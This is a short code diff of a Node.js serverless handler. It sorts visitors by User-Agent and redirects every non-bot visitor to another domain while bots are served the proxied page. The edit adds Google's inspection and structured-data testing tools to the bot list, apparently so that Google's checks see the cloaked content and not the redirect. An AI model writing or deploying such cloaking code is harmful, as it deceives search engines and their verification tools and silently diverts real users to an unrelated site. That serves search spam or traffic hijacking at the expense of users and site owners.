@@ -3,10 +3,10 @@ module.exports = async (req, res) => {
   const proxyHost = req.headers.host;
   const userAgent = req.headers["user-agent"] || "";
 
-  // ✅ Bot detect karo
-  const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebot|ia_archiver|spider|crawl|bot/i.test(userAgent);
+  // ✅ Bot detect karo - Google Inspection Tool bhi include hai
+  const isBot = /googlebot|google-inspectiontool|google-structured-data-testing-tool|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebot|ia_archiver|spider|crawl|bot/i.test(userAgent);
 
-  // ✅ Real user ko same page pe redirect karo doosri site pe
+  // ✅ Real user ko same page pe redirect karo
   if (!isBot) {
     return res.redirect(302, `https://NewJobstoday.job4intern.com${req.url}`);
   }
